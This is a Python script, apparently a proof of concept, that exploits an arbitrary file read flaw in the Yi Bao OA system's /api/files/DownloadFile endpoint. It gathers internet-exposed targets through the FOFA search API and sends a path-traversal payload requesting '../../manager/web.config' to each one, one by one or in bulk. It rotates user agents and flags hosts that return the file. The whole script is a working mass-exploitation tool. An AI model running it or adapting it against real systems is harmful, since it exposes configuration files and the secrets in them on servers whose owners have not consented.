#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import random
import json
import argparse
import re
from tqdm import tqdm

def UA():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.3',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 EDGE/16.16299',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'
    ]
    random_user_agent = random.choice(user_agents)
    headers = random_user_agent
    return headers

def Target_collection(filename): # 目标收集
    urls = [
        "https://fofa.info/api/v1/search/all?email=xxxxxxx&key=xxxxxxx&qbase64=YXBwPSLpobborq/np5HmioAt5piT5a6dT0Hns7vnu58i&size=9999" # app="顶讯科技-易宝OA系统"
        # 自行配置fofa邮箱和api key
    ]

    for url in urls:
        try:
            res = requests.get(url)
            respBody = res.text
            respBody = json.loads(respBody)
            if "results" in respBody:
                with open(filename, "a") as fp:
                    for ioc in respBody["results"]:
                        url = str(ioc[0])
                        if "http" not in url:
                            url = "http://" + str(url)
                        fp.write("{}\n".format(str(url)))
        except Exception as e:
            with open(filename + ".error", "a") as ferrorP:
                ferrorP.write(str(e) + "\n")

def Single_objective_testing(base_url): # 单目标检测
    path = "/api/files/DownloadFile"
    header = {
        "User-Agent": UA()
    }
    data = {
        "token":"zxh",
        "requestFileName":"../../manager/web.config",
        "pathType":"1",
        "startPosition":"0",
        "bufferSize":"1000"
    }
    full_url = base_url + path
    # print(full_url)
    try:
        rqg = requests.post(full_url, headers=header, data=data, verify=False, allow_redirects=False, timeout=2)
        if rqg.status_code == 200 and "data" in rqg.text and "success" in rqg.text and "true" in rqg.text:
            msg = "{} 存在漏洞".format(full_url)
            return True, msg, full_url
        else:
            msg = "{} 不存在漏洞".format(full_url)
            return False, msg, full_url
    except requests.Timeout:
        msg = "{} 超时 ({} 秒)".format(full_url, 2)
        return False, msg, full_url
    except Exception as e:
        msg = "{} 报错: {}".format(full_url, str(e))
        return False, msg, full_url

def Multi_objective_testing(file): # 多目标检查
    with open(file, "r") as f:
        lines = f.readlines()
        for url in tqdm(lines, desc="Checking Progress", position=0, leave=False, ncols=80):
            url = url.strip()
            if "https" not in url:
                flag, msg, urls = Single_objective_testing(url)
                if flag:
                    tqdm.write(str(msg))  # 使用 tqdm.write 输出，不打断 tqdm 进度条

def main():
    parser = argparse.ArgumentParser(description="### Yi Bao OA downloadfile interface has an arbitrary file reading vulnerability. ###")
    parser.add_argument("-t", "--target_collection", action="store_true", help="Perform target collection")
    parser.add_argument("-r", "--multi_objective_testing", metavar="FILE", help="Perform multi-objective testing. e.g:python yibaoOA_DownloadFile_readFile.py -r ./url.txt")
    parser.add_argument("-u", "--single_objective_testing", metavar="URL", help="Perform single-objective testing. e.g:python yibaoOA_DownloadFile_readFile.py -u http://xxx.xxx.xxx")

    args = parser.parse_args()

    if args.target_collection:
        Target_collection("./url.txt")
    elif args.multi_objective_testing:
        Multi_objective_testing(args.multi_objective_testing)
    elif args.single_objective_testing:
        flag, msg, url = Single_objective_testing(args.single_objective_testing)
        if flag:
            print(str(msg) + ": " + str(url))
        # else:
        #     print(msg)
    else:
        print("No valid options provided. Use -h for help.")

if __name__ == "__main__":
    main()
